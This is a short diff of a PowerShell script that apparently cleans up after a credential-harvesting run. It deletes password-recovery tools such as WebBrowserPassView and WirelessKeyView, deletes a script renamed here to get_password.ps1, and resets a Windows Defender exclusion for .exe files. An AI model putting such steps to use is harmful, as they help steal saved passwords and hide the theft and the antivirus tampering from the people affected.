@@ -22,7 +22,7 @@ Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
-Remove-Item ciaoV2.ps1
+Remove-Item get_password.ps1
 
 # Reset antivirus exception
 Remove-MpPreference -ExclusionExtension exe -Force
